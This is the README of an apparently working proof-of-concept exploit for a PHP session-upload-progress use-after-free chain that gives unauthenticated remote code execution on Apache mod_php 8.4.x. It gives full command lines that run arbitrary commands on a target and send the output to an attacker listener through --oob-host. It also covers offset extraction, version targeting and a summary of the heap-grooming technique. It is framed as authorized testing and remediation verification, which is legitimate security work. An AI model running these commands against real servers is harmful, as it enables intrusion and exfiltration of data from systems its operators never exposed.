# php2shell-poc

Single-file, fully-remote PoC for **CVE-2026-109618 / CVE-2026-109619** — the PHP
`session.upload_progress` OOM Use-After-Free chain leading to unauthenticated RCE.

Everything is in **`php2shell.py`** (Python 3, standard library only — no `pip
install`, no helper files, no gdb). It recons the target, picks the right binary
offsets, and runs your command, returning the **command output over the network**
(nothing is written to the target's disk).

> ⚠️ **AUTHORIZED USE ONLY.** Run this only against systems you own or are
> explicitly permitted to test. This is a functioning RCE exploit.

---

## Requirements

- Python 3.8+ on your machine (attacker side). No dependencies.
- Network access **from the target back to you** for the out-of-band (OOB) proof
  listener (`--oob-host` / `--oob-port`). If the target can't reach you, use
  `--no-oob` and supply your own exfil in `--cmd`.

## Quick start

```bash
# Fingerprint the target, auto-pick offsets, and run `id`:
python3 php2shell.py --host 10.0.4.21 --port 80 --path /index.php \
    --recon --oob-host 10.0.0.5 --cmd 'id'
```

Expected output on success:

```
[*] recon: Server='Apache/2.4.69 (Debian)' X-Powered-By='PHP/8.4.26' -> PHP 8.4.26 (likely mod_php ...)
[*] offset DB hit for PHP 8.4.26: zif=0x465370 dtor=0x65eb60 [validated]
      pinned 150/150 workers (149 holders)
[try 1] A1: END-cleanup send_cookie OOM
[try 1] B1: stale-id OOB read (chunk base + libphp)
      decoded=819208 zval_ptr_dtor=0x7f... -> libphp=0x7f...
[try 1] A2 + B2: main=0x7f... zif_system=0x7f...
[+] RCE CONFIRMED (out-of-band) — command output:
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The last block is the **actual output of your `--cmd` on the target**, exfiltrated
back to the built-in listener.

## Common commands

```bash
# fingerprint + run id (recommended default)
python3 php2shell.py --host T --port 80 --recon --oob-host YOU --cmd 'id'

# grab a version file
python3 php2shell.py --host T --port 80 --recon --oob-host YOU --cmd 'cat /etc/os-release'

# skip recon if you already know the version
python3 php2shell.py --host T --port 80 --php-version 8.4.25 --oob-host YOU --cmd 'id'

# single-worker lab (not the stock 150-worker prefork)
python3 php2shell.py --host T --port 80 --workers 1 --oob-host YOU --cmd 'id'
```

### Key flags

| Flag | Meaning |
|---|---|
| `--host / --port / --path` | target web server and PHP script path |
| `--recon` | fingerprint via `Server` / `X-Powered-By` and auto-pick offsets |
| `--php-version X.Y.Z` | skip recon; use offsets for this version |
| `--oob-host` | **your** IP/hostname **as reachable from the target** (the output is sent here) |
| `--oob-port` / `--listen` | listener port / bind address (default `8888` / `0.0.0.0`) |
| `--cmd` | command to run on the target (default `id`) |
| `--workers N` | Apache prefork `MaxRequestWorkers` (default `150` = stock) |
| `--no-oob` | blind mode: run `--cmd` as-is without exfiltrating output |
| `--zif-offset / --dtor-offset` | manual offsets (override DB/recon) |
| `--list-offsets` | print the bundled offset database and exit |
| `--extract LIBPHP.SO` | offline: extract offsets from a `libphp.so` binary and exit |

## What works / what doesn't (tested)

**Targets:** Apache **mod_php, prefork MPM**. PHP-FPM is **not** exploitable with
this chain (the worker exits on the OOM), regardless of offsets.

| PHP version (official `php:*-apache`) | Status |
|---|---|
| 8.4.24 / 8.4.25 / 8.4.26 | ✅ Working end-to-end (offsets extracted, heap shapes validated) |
| 8.4.27+ / 8.3.36+ / 8.2.35+ / 8.5.12+ | ⛔ Patched — tool detects and refuses |
| 8.2.x / 8.3.x / 8.5.x (vulnerable) | ⚠️ Offsets known, but the OOM heap-shape needs per-minor-line recalibration; chain currently fails at the leak stage |

**Bottom line for triage:** out of the box this confirms exploitability on
**8.4.x mod_php prefork**. For other minor lines it will report "all attempts
failed" (offsets are correct but the heap shape differs). For FPM or
backported-distro builds, rely on your vendor security advisory rather than this
tool.

## Extracting offsets for a custom/internal build

If your server runs a non-official build, get its `libphp.so` and extract offsets
locally, then pass them explicitly:

```bash
# on a host with the same libphp.so (or a copy of it):
python3 php2shell.py --extract /usr/lib/apache2/modules/libphp.so
#   -> zif_system     = 0x465370
#   -> zval_ptr_dtor  = 0x65eb60

python3 php2shell.py --host T --port 80 \
    --zif-offset 0x465370 --dtor-offset 0x65eb60 --oob-host YOU --cmd 'id'
```

The `.so` must be **non-stripped** (needs the `zif_system` local symbol). If it's
stripped, use the matching debug-info package.

## How it works (one paragraph)

OOM during multipart parsing in `php_request_startup()` triggers a `longjmp` that
leaves session state (`PS(id)`, `PS(http_session_vars)`) dangling; a `Transfer-
Encoding: chunked` request bypasses `post_max_size` so a huge body can groom the
heap. Request B1 turns the dangling `PS(id)` into an out-of-bounds read that leaks
heap + `libphp` base (defeating ASLR) via `Set-Cookie`; A2/B2 then spray a fake
`zend_array` whose `pDestructor` is `zif_system`, so request shutdown runs
`system(cmd)`. Worker pinning (holding `MaxRequestWorkers-1` connections) forces
all four requests onto the same prefork child.

---

*Consolidated and extended from the public research at 9bie/php2shell-bypass-aslr-exp.
For authorized security testing and remediation verification only.*
